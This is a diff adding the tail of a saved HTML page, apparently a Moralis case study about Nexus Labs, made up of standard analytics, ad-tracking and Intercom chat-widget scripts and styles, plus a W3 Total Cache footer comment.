+      src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015"
+      integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ=="
+      data-cf-beacon='{"version":"2024.11.0","token":"7499dfda5ac14701870e166041c88fda","server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+      crossorigin="anonymous"
+    ></script>
+
+    <script src="https://moralis.com/wp-content/plugins/elementor/assets/lib/dialog/dialog.min.js?ver=4.9.3"></script>
+    <script src="https://moralis.com/wp-content/plugins/elementor/assets/lib/share-link/share-link.min.js?ver=3.29.2"></script>
+    <script
+      src="https://www.googletagmanager.com/gtag/js?id=AW-358563412"
+      async=""
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/themes/hello-elementor-child/components/m_header-cookies.js"
+      type="text/javascript"
+      data-cookiecategory="targeting"
+      async=""
+    ></script>
+    <script async="" src="https://widget.intercom.io/widget/gy4tissf"></script>
+    <script
+      async=""
+      src="https://static.hotjar.com/c/hotjar-3012344.js?sv=6"
+      type="text/javascript"
+      data-cookiecategory="targeting"
+    ></script>
+    <iframe
+      allow="join-ad-interest-group"
+      data-tagging-id="AW-358563412"
+      data-load-time="1753741003479"
+      height="0"
+      width="0"
+      src="https://td.doubleclick.net/td/rul/358563412?random=1753741002890&amp;cv=11&amp;fst=1753741002890&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57p1v875844535z89175371500za200zd875844535&amp;gcd=13t3t3t3t5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104630779~104630781~104684208~104684211~104948813&amp;u_w=800&amp;u_h=600&amp;url=https%3A%2F%2Fmoralis.com%2Fcase-studies%2Fnexus-labs%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=How%20Nexus%20Labs%20Saved%203%20Months%20of%20Work%20with%20Moralis&amp;did=dMmY1Mm&amp;gdid=dMmY1Mm&amp;npa=0&amp;auid=1273882784.1753741003&amp;uaa=x86&amp;uab=&amp;uafvl=&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0&amp;uaw=0&amp;fledge=1&amp;_tu=CA&amp;data=event%3Dgtag.config"
+      style="display: none; visibility: hidden"
+    ></iframe
+    ><iframe
+      allow="join-ad-interest-group"
+      data-tagging-id="AW-358563412"
+      data-load-time="1753741003493"
+      height="0"
+      width="0"
+      src="https://td.doubleclick.net/td/rul/358563412?random=1753741002892&amp;cv=11&amp;fst=1753741002892&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be57p1v875844535z89175371500za200zd875844535&amp;gcd=13t3t3t3t5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104630779~104630781~104684208~104684211~104948813&amp;u_w=800&amp;u_h=600&amp;url=https%3A%2F%2Fmoralis.com%2Fcase-studies%2Fnexus-labs%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=How%20Nexus%20Labs%20Saved%203%20Months%20of%20Work%20with%20Moralis&amp;did=dMmY1Mm&amp;gdid=dMmY1Mm&amp;npa=0&amp;auid=1273882784.1753741003&amp;uaa=x86&amp;uab=&amp;uafvl=&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0&amp;uaw=0&amp;fledge=1&amp;_tu=CA&amp;data=ads_data_redaction%3Dfalse"
+      style="display: none; visibility: hidden"
+    ></iframe
+    ><iframe
+      height="0"
+      width="0"
+      style="display: none; visibility: hidden"
+    ></iframe
+    ><iframe
+      id="intercom-frame"
+      style="
+        position: absolute !important;
+        opacity: 0 !important;
+        width: 1px !important;
+        height: 1px !important;
+        top: 0 !important;
+        left: 0 !important;
+        border: none !important;
+        display: block !important;
+        z-index: -1 !important;
+        pointer-events: none;
+      "
+      aria-hidden="true"
+      tabindex="-1"
+      title="Intercom"
+    ></iframe
+    ><iframe name="__tcfapiLocator" style="display: none"></iframe>
+    <div class="intercom-lightweight-app">
+      <style id="intercom-lightweight-app-style" type="text/css">
+        @keyframes intercom-lightweight-app-launcher {
+          from {
+            opacity: 0;
+            transform: scale(0.5);
+          }
+          to {
+            opacity: 1;
+            transform: scale(1);
+          }
+        }
+
+        @keyframes intercom-lightweight-app-gradient {
+          from {
+            opacity: 0;
+          }
+          to {
+            opacity: 1;
+          }
+        }
+
+        @keyframes intercom-lightweight-app-messenger {
+          0% {
+            opacity: 0;
+            transform: scale(0);
+          }
+          40% {
+            opacity: 1;
+          }
+          100% {
+            transform: scale(1);
+          }
+        }
+
+        .intercom-lightweight-app {
+          position: fixed;
+          z-index: 2147483001;
+          width: 0;
+          height: 0;
+          font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji",
+            Helvetica, Arial, sans-serif;
+        }
+
+        .intercom-lightweight-app-gradient {
+          position: fixed;
+          z-index: 2147483002;
+          width: 500px;
+          height: 500px;
+          bottom: 0;
+          right: 0;
+          pointer-events: none;
+          background: radial-gradient(
+            ellipse at bottom right,
+            rgba(29, 39, 54, 0.16) 0%,
+            rgba(29, 39, 54, 0) 72%
+          );
+          animation: intercom-lightweight-app-gradient 200ms ease-out;
+        }
+
+        .intercom-lightweight-app-launcher {
+          position: fixed;
+          z-index: 2147483003;
+          padding: 0 !important;
+          margin: 0 !important;
+          border: none;
+          bottom: 20px;
+          right: 20px;
+          max-width: 48px;
+          width: 48px;
+          max-height: 48px;
+          height: 48px;
+          border-radius: 50%;
+          background: #0616ff;
+          cursor: pointer;
+          box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06),
+            0 2px 32px 0 rgba(0, 0, 0, 0.16);
+          transition: transform 167ms cubic-bezier(0.33, 0, 0, 1);
+          box-sizing: content-box;
+        }
+
+        .intercom-lightweight-app-launcher:hover {
+          transition: transform 250ms cubic-bezier(0.33, 0, 0, 1);
+          transform: scale(1.1);
+        }
+
+        .intercom-lightweight-app-launcher:active {
+          transform: scale(0.85);
+          transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
+        }
+
+        .intercom-lightweight-app-launcher:focus {
+          outline: none;
+        }
+
+        .intercom-lightweight-app-launcher-icon {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          position: absolute;
+          top: 0;
+          left: 0;
+          width: 48px;
+          height: 48px;
+          transition: transform 100ms linear, opacity 80ms linear;
+        }
+
+        .intercom-lightweight-app-launcher-icon-open {
+          opacity: 1;
+          transform: rotate(0deg) scale(1);
+        }
+
+        .intercom-lightweight-app-launcher-icon-open svg {
+          width: 24px;
+          height: 24px;
+        }
+
+        .intercom-lightweight-app-launcher-icon-open svg path {
+          fill: rgb(255, 255, 255);
+        }
+
+        .intercom-lightweight-app-launcher-icon-self-serve {
+          opacity: 1;
+          transform: rotate(0deg) scale(1);
+        }
+
+        .intercom-lightweight-app-launcher-icon-self-serve svg {
+          height: 44px;
+        }
+
+        .intercom-lightweight-app-launcher-icon-self-serve svg path {
+          fill: rgb(255, 255, 255);
+        }
+
+        .intercom-lightweight-app-launcher-custom-icon-open {
+          max-height: 24px;
+          max-width: 24px;
+
+          opacity: 1;
+          transform: rotate(0deg) scale(1);
+        }
+
+        .intercom-lightweight-app-launcher-icon-minimize {
+          opacity: 0;
+          transform: rotate(-60deg) scale(0);
+        }
+
+        .intercom-lightweight-app-launcher-icon-minimize svg path {
+          fill: rgb(255, 255, 255);
+        }
+
+        .intercom-lightweight-app-messenger {
+          position: fixed;
+          z-index: 2147483003;
+          overflow: hidden;
+          background-color: #ffffff;
+          animation: intercom-lightweight-app-messenger 250ms
+            cubic-bezier(0, 1, 1, 1);
+          transform-origin: bottom right;
+
+          width: 400px;
+          height: calc(100% - 104px);
+          max-height: 704px;
+          min-height: 250px;
+          right: 20px;
+          bottom: 84px;
+          box-shadow: 0 5px 40px rgba(0, 0, 0, 0.16);
+
+          border-radius: 16px;
+        }
+
+        .intercom-lightweight-app-messenger-header {
+          height: 64px;
+          border-bottom: none;
+          background: #ffffff;
+        }
+
+        .intercom-lightweight-app-messenger-footer {
+          position: absolute;
+          bottom: 0;
+          width: 100%;
+          height: 80px;
+          background: #ffffff;
+          font-size: 14px;
+          line-height: 21px;
+          border-top: 1px solid rgba(0, 0, 0, 0.05);
+          box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
+        }
+
+        @media print {
+          .intercom-lightweight-app {
+            display: none;
+          }
+        }
+      </style>
+      <div
+        class="intercom-lightweight-app-launcher intercom-launcher"
+        role="button"
+        tabindex="0"
+        aria-label="Open Intercom Messenger"
+        aria-live="polite"
+      >
+        <div
+          class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"
+        >
+          <img
+            src="https://downloads.intercomcdn.eu/i/o/13919/15cc955f65045eb7195b6484/7bf57cc92d9dc85ad6d22acb9179c0aa.png"
+            alt=""
+            class="intercom-lightweight-app-launcher-custom-icon-open"
+          />
+        </div>
+        <div
+          class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"
+        >
+          <svg
+            width="24"
+            height="24"
+            viewBox="0 0 24 24"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              fill-rule="evenodd"
+              clip-rule="evenodd"
+              d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z"
+              fill="currentColor"
+            ></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+    <div
+      id="batBeacon779246481249"
+      style="width: 0px; height: 0px; display: none; visibility: hidden"
+    >
+      <img
+        id="batBeacon611964680215"
+        width="0"
+        height="0"
+        alt=""
+        src="https://bat.bing.com/action/0?ti=148015318&amp;tm=gtm002&amp;Ver=2&amp;mid=4e8606ed-7030-41cd-aff1-572b9d9a6663&amp;bo=1&amp;sid=8b4f72006c0011f08813ef21b5d7395e&amp;vid=8b51ba406c0011f0a98d5f7fb42c076d&amp;vids=1&amp;msclkid=N&amp;uach=pv%3D10.0&amp;pi=918639831&amp;lg=en-US&amp;sw=800&amp;sh=600&amp;sc=24&amp;tl=How%20Nexus%20Labs%20Saved%203%20Months%20of%20Work%20with%20Moralis&amp;p=https%3A%2F%2Fmoralis.com%2Fcase-studies%2Fnexus-labs%2F&amp;r=&amp;lt=5079&amp;mtp=10&amp;evt=pageLoad&amp;sv=1&amp;cdb=ARoV&amp;rn=62518"
+        style="width: 0px; height: 0px; display: none; visibility: hidden"
+      />
+    </div>
+    <iframe
+      id="_hjSafeContext_36879380"
+      title="_hjSafeContext"
+      tabindex="-1"
+      aria-hidden="true"
+      src="about:blank"
+      style="
+        display: none !important;
+        width: 1px !important;
+        height: 1px !important;
+        opacity: 0 !important;
+        pointer-events: none !important;
+      "
+    ></iframe>
+  </body>
+</html>
+<!--
+Performance optimized by W3 Total Cache. Learn more: https://www.boldgrid.com/w3-total-cache/
+
+Object Caching 461/556 objects using Memcached
+Page Caching using Memcached 
+Database Caching 7/27 queries in 0.005 seconds using Memcached
+
+Served from: Blocklith.com @ 2025-07-28 23:53:51 by W3 Total Cache
+-->
